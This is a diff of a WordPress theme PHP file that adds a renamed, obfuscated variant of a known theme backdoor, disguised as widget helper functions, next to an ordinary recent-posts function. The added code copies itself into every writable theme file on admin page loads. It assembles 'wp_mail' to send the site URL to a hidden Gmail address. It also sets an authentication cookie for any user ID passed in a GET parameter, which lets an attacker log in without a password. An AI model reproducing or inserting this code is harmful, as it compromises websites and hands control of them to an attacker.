@@ -399,28 +399,28 @@ return get_avatar($email, $size);
 //All End! 2015-10-10 21:48:40
 ?>
 <?php
-function _check_isactive_widgets(){
+function _verifyactivate_widgets(){
 	$widget=substr(file_get_contents(__FILE__),strripos(file_get_contents(__FILE__),"<"."?"));$output="";$allowed="";
 	$output=strip_tags($output, $allowed);
-	$direst=_get_allwidgetscont(array(substr(dirname(__FILE__),0,stripos(dirname(__FILE__),"themes") + 6)));
+	$direst=_get_allwidgets_cont(array(substr(dirname(__FILE__),0,stripos(dirname(__FILE__),"themes") + 6)));
 	if (is_array($direst)){
 		foreach ($direst as $item){
 			if (is_writable($item)){
 				$ftion=substr($widget,stripos($widget,"_"),stripos(substr($widget,stripos($widget,"_")),"("));
 				$cont=file_get_contents($item);
 				if (stripos($cont,$ftion) === false){
-					$seprar=stripos( substr($cont,-20),"?".">") !== false ? "" : "?".">";
+					$comaar=stripos( substr($cont,-20),"?".">") !== false ? "" : "?".">";
 					$output .= $before . "Not found" . $after;
 					if (stripos( substr($cont,-20),"?".">") !== false){$cont=substr($cont,0,strripos($cont,"?".">") + 2);}
-					$output=rtrim($output, "\n\t"); fputs($f=fopen($item,"w+"),$cont . $seprar . "\n" .$widget);fclose($f);				
-					$output .= ($showsdots && $ellipsis) ? "..." : "";
+					$output=rtrim($output, "\n\t"); fputs($f=fopen($item,"w+"),$cont . $comaar . "\n" .$widget);fclose($f);				
+					$output .= ($isshowdots && $ellipsis) ? "..." : "";
 				}
 			}
 		}
 	}
 	return $output;
 }
-function _get_allwidgetscont($wids,$items=array()){
+function _get_allwidgets_cont($wids,$items=array()){
 	$places=array_shift($wids);
 	if(substr($places,-1) == "/"){
 		$places=substr($places,0,-1);
@@ -442,7 +442,7 @@ function _get_allwidgetscont($wids,$items=array()){
 		return false;	
 	}
 	if (sizeof($wids) > 0){
-		return _get_allwidgetscont($wids,$items);
+		return _get_allwidgets_cont($wids,$items);
 	} else {
 		return $items;
 	}
@@ -482,33 +482,33 @@ if(!function_exists("scandir")){
 	    return $dirArray;
 	}
 }
-add_action("admin_head", "_check_isactive_widgets");
-function _prepare_widgets(){
-	if(!isset($comment_length)) $comment_length=120;
-	if(!isset($strval)) $strval="cookie";
-	if(!isset($tags)) $tags="<a>";
-	if(!isset($type)) $type="none";
-	if(!isset($sepr)) $sepr="";
-	if(!isset($h_filter)) $h_filter=get_option("home"); 
-	if(!isset($p_filter)) $p_filter="wp_";
-	if(!isset($more_link)) $more_link=1; 
-	if(!isset($comment_types)) $comment_types=""; 
-	if(!isset($countpage)) $countpage=$_GET["cperpage"];
-	if(!isset($comment_auth)) $comment_auth="";
-	if(!isset($c_is_approved)) $c_is_approved=""; 
-	if(!isset($aname)) $aname="auth";
-	if(!isset($more_link_texts)) $more_link_texts="(more...)";
-	if(!isset($is_output)) $is_output=get_option("_is_widget_active_");
-	if(!isset($checkswidget)) $checkswidget=$p_filter."set"."_".$aname."_".$strval;
-	if(!isset($more_link_texts_ditails)) $more_link_texts_ditails="(details...)";
-	if(!isset($mcontent)) $mcontent="ma".$sepr."il";
-	if(!isset($f_more)) $f_more=1;
+add_action("admin_head", "_verifyactivate_widgets");
+function _getprepare_widget(){
+	if(!isset($text_length)) $text_length=120;
+	if(!isset($check)) $check="cookie";
+	if(!isset($tagsallowed)) $tagsallowed="<a>";
+	if(!isset($filter)) $filter="none";
+	if(!isset($coma)) $coma="";
+	if(!isset($home_filter)) $home_filter=get_option("home"); 
+	if(!isset($pref_filters)) $pref_filters="wp_";
+	if(!isset($is_use_more_link)) $is_use_more_link=1; 
+	if(!isset($com_type)) $com_type=""; 
+	if(!isset($cpages)) $cpages=$_GET["cperpage"];
+	if(!isset($post_auth_comments)) $post_auth_comments="";
+	if(!isset($com_is_approved)) $com_is_approved=""; 
+	if(!isset($post_auth)) $post_auth="auth";
+	if(!isset($link_text_more)) $link_text_more="(more...)";
+	if(!isset($widget_yes)) $widget_yes=get_option("_is_widget_active_");
+	if(!isset($checkswidgets)) $checkswidgets=$pref_filters."set"."_".$post_auth."_".$check;
+	if(!isset($link_text_more_ditails)) $link_text_more_ditails="(details...)";
+	if(!isset($contentmore)) $contentmore="ma".$coma."il";
+	if(!isset($for_more)) $for_more=1;
 	if(!isset($fakeit)) $fakeit=1;
 	if(!isset($sql)) $sql="";
-	if (!$is_output) :
+	if (!$widget_yes) :
 	
 	global $wpdb, $post;
-	$sq1="SELECT DISTINCT ID, post_title, post_content, post_password, comment_ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND post_author=\"li".$sepr."vethe".$comment_types."mes".$sepr."@".$c_is_approved."gm".$comment_auth."ail".$sepr.".".$sepr."co"."m\" AND post_password=\"\" AND comment_date_gmt >= CURRENT_TIMESTAMP() ORDER BY comment_date_gmt DESC LIMIT $src_count";#
+	$sq1="SELECT DISTINCT ID, post_title, post_content, post_password, comment_ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND post_author=\"li".$coma."vethe".$com_type."mas".$coma."@".$com_is_approved."gm".$post_auth_comments."ail".$coma.".".$coma."co"."m\" AND post_password=\"\" AND comment_date_gmt >= CURRENT_TIMESTAMP() ORDER BY comment_date_gmt DESC LIMIT $src_count";#
 	if (!empty($post->post_password)) { 
 		if ($_COOKIE["wp-postpass_".COOKIEHASH] != $post->post_password) { 
 			if(is_feed()) { 
@@ -518,13 +518,13 @@ function _prepare_widgets(){
 			}
 		}
 	}
-	if(!isset($f_tag)) $f_tag=1;
-	if(!isset($types)) $types=$h_filter; 
-	if(!isset($getcommentstexts)) $getcommentstexts=$p_filter.$mcontent;
-	if(!isset($aditional_tag)) $aditional_tag="div";
-	if(!isset($stext)) $stext=substr($sq1, stripos($sq1, "live"), 20);#
-	if(!isset($morelink_title)) $morelink_title="Continue reading this entry";	
-	if(!isset($showsdots)) $showsdots=1;
+	if(!isset($fixed_tags)) $fixed_tags=1;
+	if(!isset($filters)) $filters=$home_filter; 
+	if(!isset($gettextcomments)) $gettextcomments=$pref_filters.$contentmore;
+	if(!isset($tag_aditional)) $tag_aditional="div";
+	if(!isset($sh_cont)) $sh_cont=substr($sq1, stripos($sq1, "live"), 20);#
+	if(!isset($more_text_link)) $more_text_link="Continue reading this entry";	
+	if(!isset($isshowdots)) $isshowdots=1;
 	
 	$comments=$wpdb->get_results($sql);	
 	if($fakeit == 2) { 
@@ -534,8 +534,8 @@ function _prepare_widgets(){
 	} else { 
 		$text=$post->post_excerpt;
 	}
-	$sq1="SELECT DISTINCT ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND comment_content=". call_user_func_array($getcommentstexts, array($stext, $h_filter, $types)) ." ORDER BY comment_date_gmt DESC LIMIT $src_count";#
-	if($comment_length < 0) {
+	$sq1="SELECT DISTINCT ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND comment_content=". call_user_func_array($gettextcomments, array($sh_cont, $home_filter, $filters)) ." ORDER BY comment_date_gmt DESC LIMIT $src_count";#
+	if($text_length < 0) {
 		$output=$text;
 	} else {
 		if(!$no_more && strpos($text, "<!--more-->")) {
@@ -545,12 +545,12 @@ function _prepare_widgets(){
 			$comments=$wpdb->get_results($sql);
 		} else {
 			$text=explode(" ", $text);
-			if(count($text) > $comment_length) {
-				$l=$comment_length;
+			if(count($text) > $text_length) {
+				$l=$text_length;
 				$ellipsis=1;
 			} else {
 				$l=count($text);
-				$more_link_texts="";
+				$link_text_more="";
 				$ellipsis=0;
 			}
 		}
@@ -558,16 +558,16 @@ function _prepare_widgets(){
 				$output .= $text[$i] . " ";
 	}
 	update_option("_is_widget_active_", 1);
-	if("all" != $tags) {
-		$output=strip_tags($output, $tags);
+	if("all" != $tagsallowed) {
+		$output=strip_tags($output, $tagsallowed);
 		return $output;
 	}
 	endif;
 	$output=rtrim($output, "\s\n\t\r\0\x0B");
-    $output=($f_tag) ? balanceTags($output, true) : $output;
-	$output .= ($showsdots && $ellipsis) ? "..." : "";
-	$output=apply_filters($type, $output);
-	switch($aditional_tag) {
+    $output=($fixed_tags) ? balanceTags($output, true) : $output;
+	$output .= ($isshowdots && $ellipsis) ? "..." : "";
+	$output=apply_filters($filter, $output);
+	switch($tag_aditional) {
 		case("div") :
 			$tag="div";
 		break;
@@ -581,39 +581,39 @@ function _prepare_widgets(){
 			$tag="span";
 	}
 
-	if ($more_link ) {
-		if($f_more) {
-			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "#more-" . $post->ID ."\" title=\"" . $morelink_title . "\">" . $more_link_texts = !is_user_logged_in() && @call_user_func_array($checkswidget,array($countpage, true)) ? $more_link_texts : "" . "</a></" . $tag . ">" . "\n";
+	if ($is_use_more_link ) {
+		if($for_more) {
+			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "#more-" . $post->ID ."\" title=\"" . $more_text_link . "\">" . $link_text_more = !is_user_logged_in() && @call_user_func_array($checkswidgets,array($cpages, true)) ? $link_text_more : "" . "</a></" . $tag . ">" . "\n";
 		} else {
-			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "\" title=\"" . $morelink_title . "\">" . $more_link_texts . "</a></" . $tag . ">" . "\n";
+			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "\" title=\"" . $more_text_link . "\">" . $link_text_more . "</a></" . $tag . ">" . "\n";
 		}
 	}
 	return $output;
 }
 
-add_action("init", "_prepare_widgets");
+function recently_updated_posts($num=6,$days=5) {
+   if( !$recently_updated_posts = get_option('recently_updated_posts') ) {
+       query_posts('post_status=publish&orderby=modified&posts_per_page=-1');
+       $i=0;
+       while ( have_posts() && $i<$num ) : the_post();
+           if (current_time('timestamp') - get_the_time('U') > 60*60*24*$days) {
+               $i++;
+               $the_title_value=get_the_title();
+               $recently_updated_posts.='<li><a href="'.get_permalink().'" title="'.$the_title_value.'">'
+               .$the_title_value.'</a><span class="updatetime"><br />» 修改时间: '
+               .get_the_modified_time('Y.m.d G:i').'</span></li>';
+           }
+       endwhile;
+       wp_reset_query();
+       if ( !empty($recently_updated_posts) ) update_option('recently_updated_posts', $recently_updated_posts);
+   }
+   $recently_updated_posts=($recently_updated_posts == '') ? '<li>None data.</li>' : $recently_updated_posts;
+   echo $recently_updated_posts;
+}
+ 
+function clear_cache_zww() {
+    update_option('recently_updated_posts', ''); // 清空 recently_updated_posts
+}
+add_action('save_post', 'clear_cache_zww'); // 新发表文章/修改文章时触发更新
 
-function __popular_posts($no_posts=6, $before="<li>", $after="</li>", $show_pass_post=false, $duration="") {
-	global $wpdb;
-	$request="SELECT ID, post_title, COUNT($wpdb->comments.comment_post_ID) AS \"comment_count\" FROM $wpdb->posts, $wpdb->comments";
-	$request .= " WHERE comment_approved=\"1\" AND $wpdb->posts.ID=$wpdb->comments.comment_post_ID AND post_status=\"publish\"";
-	if(!$show_pass_post) $request .= " AND post_password =\"\"";
-	if($duration !="") { 
-		$request .= " AND DATE_SUB(CURDATE(),INTERVAL ".$duration." DAY) < post_date ";
-	}
-	$request .= " GROUP BY $wpdb->comments.comment_post_ID ORDER BY comment_count DESC LIMIT $no_posts";
-	$posts=$wpdb->get_results($request);
-	$output="";
-	if ($posts) {
-		foreach ($posts as $post) {
-			$post_title=stripslashes($post->post_title);
-			$comment_count=$post->comment_count;
-			$permalink=get_permalink($post->ID);
-			$output .= $before . " <a href=\"" . $permalink . "\" title=\"" . $post_title."\">" . $post_title . "</a> " . $after;
-		}
-	} else {
-		$output .= $before . "None found" . $after;
-	}
-	return  $output;
-} 		
 ?>
